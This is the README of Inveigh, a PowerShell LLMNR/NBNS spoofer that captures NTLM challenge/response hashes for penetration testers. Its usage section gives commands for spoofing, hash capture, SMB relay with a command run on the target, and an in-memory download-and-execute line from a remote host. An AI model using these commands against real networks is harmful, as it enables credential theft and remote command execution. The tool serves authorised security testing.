# Inveigh
Inveigh is a Windows PowerShell LLMNR/NBNS spoofer designed to assist penetration testers that find themselves limited to a Windows system. This can commonly occur while performing standard post exploitation, phishing attacks, USB drive attacks, VLAN pivoting, or simply being restricted to a Windows system as part of client imposed restrictions.

# Requirements
Tested minimums are PowerShell 2.0 and .NET 3.5

# Notes
1. Currently supports IPv4 LLMNR/NBNS spoofing and HTTP/HTTPS/SMB NTLMv1/NTLMv2 challenge/response capture.
2. LLMNR/NBNS spoofing is performed through sniffing and sending with raw sockets. 
3. SMB challenge/response captures are performed by sniffing over the host system's SMB service.
4. HTTP challenge/response captures are performed with a dedicated listener.
5. The local LLMNR/NBNS services do not need to be disabled on the host system. 
6. LLMNR/NBNS spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind.
7. Kerberos should downgrade for SMB authentication due to spoofed hostnames not being valid in DNS.
8. Ensure that the LMMNR,NBNS,SMB,HTTP ports are open within any local firewall on the host system.
9. If you copy/paste challenge/response captures from output window for password cracking, remove carriage returns.
10. SMB relay support is experimental at this point, use caution if employing on a pen test.

# Usage
Obtain an elevated administrator or SYSTEM shell and use a method to load the module

To import with Import-Method:  
Import-Module ./Inveigh.ps1

To import with dot source method:  
. ./Inveigh.ps1

To load into memory using Invoke-Expression:  
IEX (New-Object Net.WebClient).DownloadString("http://yourhost/Inveigh.ps1")

To execute with default settings:  
Invoke-Inveigh

To load and execute with one line:    
Import-Module ./Inveigh.ps1;Invoke-Inveigh

To execute with features enabled/disabled:   
Invoke-Inveigh -IP 'local IP' -SpoofIP 'local or remote IP' -LLMNR Y/N -NBNS Y/N -NBNSTypes 00,03,20,1B -HTTP Y/N -HTTPS Y/N -SMB Y/N -Repeat Y/N -ConsoleOutput Y/N -FileOutput Y/N -OutputDir 'valid folder path'

To execute with SMB relay enabled:  
Invoke-Inveigh -SMBRelay Y -SMBRelayTarget 'valid SMB target IP' -SMBRelayCommand "valid command to run on target"

Use 'Get-Help -parameter * Invoke-Inveigh' for a full list of parameters

# Cmdlets
Invoke-Inveigh - Start Inveigh with or without parameters  
Get-Inveigh - Get queued console output  
Get-InveighLog - Get log entries  
Get-InveighNTLM - Get all captured challenge/response hashes  
Get-InveighNTLMv1 - Get captured NTLMv1 challenge/response hashes  
Get-InveighNTLMv2 - Get captured NTLMv2 challenge/response hashes  
Get-InveighStats - Get captured challenge/response counts  
Get-InveighHelp - List the cmdlets  
Watch-Inveigh - Enable real time console output  
Clear-Inveigh - Clear capture, log, smbrelay, and spoof lists  
Stop-Inveigh - Stop Inveigh  

# Screenshots
Invoke-Inveigh execution with real time console and file output enabled
![inveigh1](https://cloud.githubusercontent.com/assets/5897462/10326306/98bb11da-6c67-11e5-8c58-c9ed1107ec19.png)

Retrieval of captured NTLM2 challenge/response hashes with Get-InveighNTLMv2
![inveigh2](https://cloud.githubusercontent.com/assets/5897462/10326313/abde41d8-6c67-11e5-91b8-0c55271ba326.png)

HTTP to SMB Relay
![inveigh3](https://cloud.githubusercontent.com/assets/5897462/10326314/b2de540a-6c67-11e5-8627-fe5d27018dc3.png)

Module import and execution through one of Ben Turner and Dave Hardy's Metasploit Interactive PowerShell Session payloads
![inveigh5](https://cloud.githubusercontent.com/assets/5897462/10354363/53e73784-6d2d-11e5-8509-9bb7f3feab88.png)
